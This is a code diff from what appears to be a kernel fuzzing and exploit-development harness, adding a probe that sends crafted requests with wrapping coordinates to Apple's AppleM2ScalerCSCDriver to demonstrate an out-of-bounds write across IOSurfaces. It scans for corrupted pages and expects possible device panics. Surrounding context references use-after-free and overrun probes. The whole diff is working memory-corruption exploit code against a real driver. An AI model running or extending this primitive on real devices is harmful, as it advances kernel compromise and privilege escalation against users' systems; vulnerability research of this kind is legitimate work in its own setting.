@@ -16457,6 +16457,69 @@ static void p_overrun(void) {
     LOG("[ovr] done (alive)");
 }
 
+// V103: clean cross-surface write proof. Statics hypothesis: Y-wrap fill starts
+// at dst_base + sign17(Y&0x1FFFF)*pitch; Y=0xFFFFFFF0 -> Y' = -16 rows
+// (pitch 0x1000 at 1024-wide BGRA) => base - 0x10000, span ≈ 8064+252·W fwd.
+// 4 surfaces (1024x64, 256KB) all legit-wired; shot dst=B/C/D/A; scan all.
+static void p_xproof(void) {
+    int skip = atoi(getenv("FUZZ_XPROOF_SKIP") ?: "0");
+    LOG("[xp] v103: cross-surface write proof (skip %d)", skip);
+    io_connect_t c = open_service("AppleM2ScalerCSCDriver", 0);
+    if (!c) return;
+    uint8_t *req = must_map(0x1000);
+    IOSurfaceRef src = make_surface(64, 64);
+    enum { NK = 4 };
+    IOSurfaceRef sf[NK];
+    for (int i = 0; i < NK; i++) sf[i] = make_surface(1024, 64);
+    IOSurfaceID si = IOSurfaceGetID(src);
+    // legit-wire all four so all are mapped in the domain
+    for (int i = 0; i < NK; i++) {
+        craft_transform(req, si, IOSurfaceGetID(sf[i]), 64, 64);
+        LOG("[xp] wire s%d -> kr 0x%08x", i, scaler_call1(c, req));
+        usleep(100000);
+    }
+    usleep(1000000);
+    // markers AFTER settle: byte = surface idx + 1
+    for (int i = 0; i < NK; i++) {
+        if (IOSurfaceLock(sf[i], 0, NULL)) continue;
+        memset(IOSurfaceGetBaseAddress(sf[i]), i + 1, IOSurfaceGetAllocSize(sf[i]));
+        IOSurfaceUnlock(sf[i], 0, NULL);
+    }
+    static const struct { int dst; uint32_t W; } shots[] = {
+        { 1, 0x100 }, { 1, 0x200 }, { 2, 0x100 }, { 3, 0x100 }, { 0, 0x100 },
+    };
+    for (unsigned sh = 0; sh < sizeof(shots)/sizeof(shots[0]); sh++) {
+        if ((int)sh < skip) continue;
+        int dst = shots[sh].dst;
+        uint32_t W = shots[sh].W;
+        uint32_t X = (uint32_t)(0x100000010ULL - W);
+        LOG("[xp] shot %u: dst=s%d W 0x%x (X 0x%08x Y 0xfffffff0 H 0x20) (PANIC possible)", sh, dst, W, X);
+        fsync(fileno(stderr));   // survive a device panic (v102g/v103 lost the log to page cache)
+        border_payload(req, si, IOSurfaceGetID(sf[dst]), X, 0xFFFFFFF0, W, 0x20, 32, 32);
+        kern_return_t kr = scaler_call1(c, req);
+        LOG("[xp] shot %u -> kr 0x%08x", sh, kr);
+        usleep(200000);
+        // scan all surfaces: per-surface first/last bad page
+        for (int i = 0; i < NK; i++) {
+            if (IOSurfaceLock(sf[i], kIOSurfaceLockReadOnly, NULL)) continue;
+            uint8_t *b = (uint8_t *)IOSurfaceGetBaseAddress(sf[i]);
+            size_t total = (size_t)IOSurfaceGetAllocSize(sf[i]);
+            long bad = 0; size_t first = 0, last = 0;
+            for (size_t p = 0; p + 0x1000 <= total; p += 0x1000) {
+                if (b[p] != (uint8_t)(i + 1) || b[p + 0x800] != (uint8_t)(i + 1)) {
+                    if (!bad) first = p;
+                    last = p; bad++;
+                }
+            }
+            if (bad)
+                LOG("[xp]   s%d: %ld bad pages, 0x%zx..0x%zx, bytes %02x %02x %02x %02x",
+                    i, bad, first, last, b[first], b[first+1], b[first+2], b[first+3]);
+            IOSurfaceUnlock(sf[i], kIOSurfaceLockReadOnly, NULL);
+        }
+    }
+    LOG("[xp] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -16587,6 +16650,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_XPROOF")) { p_xproof(); LOG("[probe13] xproof-only mode, stop"); return NULL; }
         if (getenv("FUZZ_OVERRUN")) { p_overrun(); LOG("[probe13] overrun-only mode, stop"); return NULL; }
         if (getenv("FUZZ_VALHUNT")) { p_valhunt(); LOG("[probe13] valhunt-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XYWRAP")) { p_xywrap(); LOG("[probe13] xywrap-only mode, stop"); return NULL; }
